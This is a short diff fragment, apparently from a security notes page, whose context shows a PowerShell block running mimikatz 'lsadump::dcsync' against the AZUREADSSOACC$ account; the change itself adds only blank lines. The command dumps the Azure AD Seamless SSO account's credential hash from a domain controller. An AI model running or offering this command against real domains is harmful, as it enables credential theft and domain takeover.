@@ -14,3 +14,5 @@ updated_at: '2023-04-10T20:19:22.601532+00:00'
 ```powershell
 mimikatz.exe "lsadump::dcsync /user:AZUREADSSOACC$" exit
 ```
+
+
